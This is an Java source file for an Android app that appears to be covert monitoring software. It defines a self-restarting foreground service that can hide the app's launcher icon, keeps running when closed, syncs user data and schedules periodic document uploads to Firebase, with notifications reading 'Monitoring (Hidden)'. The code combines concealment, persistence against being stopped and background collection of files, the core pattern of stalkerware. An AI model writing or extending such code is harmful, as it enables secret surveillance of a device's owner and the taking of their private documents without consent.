package com.bushorat.app.services;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.bushorat.app.R;
import com.bushorat.app.activities.DashboardActivity;
import com.bushorat.app.helpers.AppVisibilityHelper;
import com.bushorat.app.helpers.DocumentSyncHelper;
import com.bushorat.app.helpers.UserDataSyncHelper;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

/**
 * Background service that runs continuously to:
 * 1. Apply and maintain visibility settings (hidden/shown)
 * 2. Sync data in background
 * 3. Upload documents
 * 4. Keep the app working even when closed or in background
 *
 * Works on Android 12+ with foreground service notifications.
 */
public class BackgroundMaintenanceService extends Service {
    private static final String TAG = "BackgroundMaintenance";
    private static final int NOTIFICATION_ID = 9999;
    private static final String CHANNEL_ID = "bushorat_background";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "BackgroundMaintenanceService created");
        
        // Create notification channel for Android 8+
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "BackgroundMaintenanceService started");
        
        // Start as foreground service
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Apply visibility settings immediately
        applyVisibilitySettings();
        
        // Schedule periodic tasks
        scheduleBackgroundTasks();
        
        // Keep service running
        return START_STICKY;
    }

    private void applyVisibilitySettings() {
        try {
            AppVisibilityHelper helper = AppVisibilityHelper.getInstance(this);
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            
            if (user != null) {
                // Start visibility listener to sync with Firebase
                helper.ensureListenerStarted();
                
                // Apply persisted visibility state
                if (helper.isAppHidden()) {
                    Log.d(TAG, "App is hidden - maintaining hidden state");
                    helper.setMainLauncherEnabled(false);
                } else {
                    Log.d(TAG, "App is visible - ensuring launcher icon enabled");
                    helper.ensureLauncherComponentEnabled();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error applying visibility settings", e);
        }
    }

    private void scheduleBackgroundTasks() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) {
                Log.w(TAG, "No user logged in, skipping background tasks");
                return;
            }
            
            // Schedule data sync
            UserDataSyncHelper.syncAll(this);
            
            // Schedule document uploads
            DocumentSyncHelper.schedulePeriodicDocumentUpload(this);
            
            Log.d(TAG, "Background tasks scheduled");
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling background tasks", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Background Services",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Running background monitoring");
            channel.enableLights(false);
            channel.enableVibration(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private NotificationCompat.Notification createNotification() {
        Intent notificationIntent = new Intent(this, DashboardActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        String title = "App Monitoring";
        String text = "Running in background";
        
        // Check if app is hidden and update notification accordingly
        try {
            AppVisibilityHelper helper = AppVisibilityHelper.getInstance(this);
            if (helper.isAppHidden()) {
                text = "Monitoring (Hidden)";
            }
        } catch (Exception e) {
            Log.d(TAG, "Could not check visibility in notification", e);
        }

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "BackgroundMaintenanceService destroyed");
        super.onDestroy();
        
        // Try to restart the service if it's killed
        Intent restartIntent = new Intent(this, BackgroundMaintenanceService.class);
        startService(restartIntent);
    }
}
